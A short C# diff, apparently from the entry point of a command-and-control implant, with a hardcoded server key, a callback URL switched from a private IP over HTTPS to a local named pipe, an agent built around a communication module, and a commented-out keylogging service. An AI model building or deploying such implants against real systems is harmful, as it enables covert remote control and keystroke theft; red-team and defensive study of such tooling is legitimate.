@@ -64,7 +64,8 @@ namespace EntryPoint
                 serverKey = "1yOdEVXef7ljnzrRgINB27Bi4zGwi1v2";
             }
 
-            connUrl = "https://192.168.48.128:443";
+            //connUrl = "https://192.168.48.128:443";
+            connUrl = "pipe://127.0.0.1:C3PO";
 
 #endif
             var connexion = ConnexionUrl.FromString(connUrl);
@@ -99,7 +100,7 @@ namespace EntryPoint
             //ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());
 
 
-            var commModule = CommunicationFactory.CreateEgressCommunicator(connexion);
+            var commModule = CommunicationFactory.CreateCommunicator(connexion);
             var agent = new Agent.Agent(metaData, commModule);
 
 
